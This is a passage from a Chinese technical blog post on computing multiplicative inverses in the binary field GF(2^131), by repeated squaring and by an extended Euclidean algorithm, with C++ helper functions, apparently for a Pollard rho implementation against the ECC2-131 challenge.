displaystyle=\"true\"><mrow><mrow></mrow><msup><mi>x</mi><mrow><msup><mn>2</mn><mn>131</mn></msup><mo>−</mo><mn>2</mn></mrow></msup></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mo lspace=\"0em\" rspace=\"0em\">=</mo></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msup><mi>x</mi><mrow><msup><mn>2</mn><mn>130</mn></msup><mo>+</mo><msup><mn>2</mn><mn>129</mn></msup><mo>+</mo><mo>⋯</mo><mo>+</mo><msup><mn>2</mn><mn>2</mn></msup><mo>+</mo><mn>2</mn></mrow></msup></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mo lspace=\"0em\" rspace=\"0em\">=</mo></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo stretchy=\"false\">(</mo><msup><mi>x</mi><mrow><msup><mn>2</mn><mn>129</mn></msup><mo>+</mo><msup><mn>2</mn><mn>128</mn></msup><mo>+</mo><mo>⋯</mo><mo>+</mo><msup><mn>2</mn><mn>2</mn></msup><mo>+</mo><mn>2</mn></mrow></msup><mo>⋅</mo><mi>x</mi><msup><mo stretchy=\"false\">)</mo><mn>2</mn></msup></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>⋯</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mo lspace=\"0em\" rspace=\"0em\">=</mo></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo stretchy=\"false\">(</mo><mo stretchy=\"false\">(</mo><mo>⋯</mo><mo stretchy=\"false\">(</mo><mo stretchy=\"false\">(</mo><msup><mi>x</mi><mn>2</mn></msup><mo>⋅</mo><mi>x</mi><msup><mo stretchy=\"false\">)</mo><mn>2</mn></msup><mo>⋅</mo><mi>x</mi><msup><mo stretchy=\"false\">)</mo><mn>2</mn></msup><mo>⋯</mo><mo>⋯</mo><mtext> </mtext><msup><mo stretchy=\"false\">)</mo><mn>2</mn></msup><mo>⋅</mo><mi>x</mi><msup><mo stretchy=\"false\">)</mo><mn>2</mn></msup></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\nx^{-1}=&amp;x^{2^{131}-2}\\\\\n=&amp;x^{2^{130}+2^{129}+\\cdots+2^2+2}\\\\\n=&amp;(x^{2^{129}+2^{128}+\\cdots+2^2+2}\\cdot x)^2\\\\\n&amp;\\cdots\\\\\n=&amp;((\\cdots((x^2\\cdot x)^2\\cdot x)^2\\cdots\\cdots)^2\\cdot x)^2\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:8.114868em;vertical-align:-3.8074339999999998em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:4.307434em;\"><span style=\"top:-6.307434em;\"><span class=\"pstrut\" style=\"height:3.03692em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.864108em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">−</span><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span></span></span><span style=\"top:-4.610514em;\"><span class=\"pstrut\" style=\"height:3.03692em;\"></span><span class=\"mord\"><span class=\"mrel\">=</span></span></span><span style=\"top:-2.9135940000000002em;\"><span class=\"pstrut\" style=\"height:3.03692em;\"></span><span class=\"mord\"><span class=\"mrel\">=</span></span></span><span style=\"top:-1.4135940000000002em;\"><span class=\"pstrut\" style=\"height:3.03692em;\"></span><span class=\"mord\"></span></span><span style=\"top:0.11051399999999978em;\"><span class=\"pstrut\" style=\"height:3.03692em;\"></span><span class=\"mord\"><span class=\"mrel\">=</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.8074339999999998em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:4.307434em;\"><span style=\"top:-6.307434em;\"><span class=\"pstrut\" style=\"height:3.03692em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.0369199999999998em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913142857142857em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">3</span><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span><span class=\"mbin mtight\">−</span><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span></span><span style=\"top:-4.610514em;\"><span class=\"pstrut\" style=\"height:3.03692em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.0369199999999998em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913142857142857em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">3</span><span class=\"mord mtight\">0</span></span></span></span></span></span></span></span></span><span class=\"mbin mtight\">+</span><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913142857142857em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">2</span><span class=\"mord mtight\">9</span></span></span></span></span></span></span></span></span><span class=\"mbin mtight\">+</span><span class=\"minner mtight\">⋯</span><span class=\"mbin mtight\">+</span><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913142857142857em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mbin mtight\">+</span><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span></span><span style=\"top:-2.9135940000000002em;\"><span class=\"pstrut\" style=\"height:3.03692em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.0369199999999998em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913142857142857em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">2</span><span class=\"mord mtight\">9</span></span></span></span></span></span></span></span></span><span class=\"mbin mtight\">+</span><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913142857142857em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">2</span><span class=\"mord mtight\">8</span></span></span></span></span></span></span></span></span><span class=\"mbin mtight\">+</span><span class=\"minner mtight\">⋯</span><span class=\"mbin mtight\">+</span><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913142857142857em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mbin mtight\">+</span><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span><span style=\"top:-1.4135940000000002em;\"><span class=\"pstrut\" style=\"height:3.03692em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">⋯</span></span></span><span style=\"top:0.11051399999999978em;\"><span class=\"pstrut\" style=\"height:3.03692em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mopen\">(</span><span class=\"mopen\">(</span><span class=\"minner\">⋯</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mopen\">(</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">⋯</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">⋯</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.8074339999999998em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>于是令：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>T</mi><mo stretchy=\"false\">(</mo><mi>s</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mo stretchy=\"false\">(</mo><mi>s</mi><mo>⋅</mo><mi>x</mi><msup><mo stretchy=\"false\">)</mo><mn>2</mn></msup></mrow><annotation encoding=\"application/x-tex\">T(s)=(s\\cdot x)^2\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">s</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">s</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.1141079999999999em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>就有：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><msup><mi>x</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>=</mo><msup><mi>T</mi><mn>129</mn></msup><mo stretchy=\"false\">(</mo><msup><mi>x</mi><mn>2</mn></msup><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">x^{-1}=T^{129}(x^2)\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.864108em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.864108em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">−</span><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.1141079999999999em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">2</span><span class=\"mord mtight\">9</span></span></span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span></span></p>\n<p>当然这个递归是可以转化为循环的，所以实现如下：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// c = a^(-1)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">gf_inv</span><span class=\"params\">(<span class=\"type\">uint64_t</span> * c, <span class=\"type\">const</span> <span class=\"type\">uint64_t</span> a[<span class=\"number\">3</span>])</span></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> t1[<span class=\"number\">3</span>], t2[<span class=\"number\">3</span>];</span><br><span class=\"line\">    <span class=\"built_in\">gf_pow2</span>(c, a);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">129</span>; ++i)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">copy</span>(c, c + <span class=\"number\">3</span>, t2);</span><br><span class=\"line\">        <span class=\"built_in\">gf_mul</span>(t1, t2, a);</span><br><span class=\"line\">        <span class=\"built_in\">gf_pow2</span>(c, t1);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"扩展欧几里得\"><a class=\"anchor\" href=\"#扩展欧几里得\">#</a> 扩展欧几里得</h2>\n<p>提交：#917</p>\n<p>参考 <a href=\"\">ECC2-131 的并行 Pollard rho 算法实现分析</a> 第 40 页的伪代码：</p>\n<p><img data-src=\"/assets/math/cryptography/finite-field/4.png\" alt=\"\" /></p>\n<p>实现如下：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// c = a ^ (-1)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">gf_inv</span><span class=\"params\">(<span class=\"type\">uint64_t</span> * c, <span class=\"type\">const</span> <span class=\"type\">uint64_t</span> a[<span class=\"number\">3</span>])</span></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> va[<span class=\"number\">3</span>] = &#123;<span class=\"number\">0x2007</span>, <span class=\"number\">0</span>, <span class=\"number\">0x8</span>&#125;;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> ua[<span class=\"number\">3</span>] = &#123;a[<span class=\"number\">0</span>], a[<span class=\"number\">1</span>], a[<span class=\"number\">2</span>]&#125;;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> g2a[<span class=\"number\">3</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> g1a[<span class=\"number\">3</span>] = &#123;<span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> * v = va;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> * u = ua;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> * g1 = g1a;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> * g2 = g2a;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>((u[<span class=\"number\">2</span>] != <span class=\"number\">0</span>) || (u[<span class=\"number\">1</span>] != <span class=\"number\">0</span>) || (u[<span class=\"number\">0</span>] != <span class=\"number\">1</span>))&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> j = <span class=\"built_in\">gf_degree</span>(u) - <span class=\"built_in\">gf_degree</span>(v);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(j &lt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            <span class=\"built_in\">swap</span>(u, v);</span><br><span class=\"line\">            <span class=\"built_in\">swap</span>(g1, g2);</span><br><span class=\"line\">            j = -j;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">gf_lsk</span>(c, v, j);</span><br><span class=\"line\">        <span class=\"built_in\">gf_add_eq</span>(u, c);</span><br><span class=\"line\">        <span class=\"built_in\">gf_lsk</span>(c, g2, j);</span><br><span class=\"line\">        <span class=\"built_in\">gf_add_eq</span>(g1, c);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">copy</span>(g1, g1 + <span class=\"number\">3</span>, c);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>其中  <code>gf_add_eq</code>  实现类似  <code>+=</code>  赋值功能：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// a += b</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">gf_add_eq</span><span class=\"params\">(<span class=\"type\">uint64_t</span> a[<span class=\"number\">5</span>], <span class=\"type\">const</span> <span class=\"type\">uint64_t</span> b[<span class=\"number\">5</span>])</span></span>&#123;</span><br><span class=\"line\">    a[<span class=\"number\">0</span>] ^= b[<span class=\"number\">0</span>];</span><br><span class=\"line\">    a[<span class=\"number\">1</span>] ^= b[<span class=\"number\">1</span>];</span><br><span class=\"line\">    a[<span class=\"number\">2</span>] ^= b[<span class=\"number\">2</span>];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><code>gf_degree</code>  返回输入数的最高位的位置</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// highest digit, 0 &lt;= d &lt;= 131</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">int</span> <span class=\"title\">gf_degree</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">uint64_t</span> a[<span class=\"number\">5</span>])</span></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> d = <span class=\"number\">131</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>( ! (a[d / <span class=\"number\">64</span>] &amp; (<span class=\"number\">1ULL</span> &lt;&lt; (d % <span class=\"number\">64</span>)))) d--;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> d;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><code>gf_lsk</code>  返回输入数据左移  <code>k</code>  位的结果，这里保证左移后的结果都是最高位不超过 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>x</mi><mn>131</mn></msup></mrow><annotation encoding=\"application/x-tex\">x^{131}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">3</span><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span></span></span></span> 的：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// left shif k digits, 0 &lt;= k &lt;= 130</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">gf_lsk</span><span class=\"params\">(<span class=\"type\">uint64_t</span> c[<span class=\"number\">3</span>], <span class=\"type\">const</span> <span class=\"type\">uint64_t</span> a[<span class=\"number\">3</span>], <span class=\"type\">int</span> k)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(k == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        c[<span class=\"number\">0</span>] = a[<span class=\"number\">0</span>];</span><br><span class=\"line\">        c[<span class=\"number\">1</span>] = a[<span class=\"number\">1</span>];</span><br><span class=\"line\">        c[<span class=\"number\">2</span>] = a[<span class=\"number\">2</span>];</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"type\">int</span> i = k / <span class=\"number\">64</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> j = k % <span class=\"number\">64</span>;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span>(i)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span 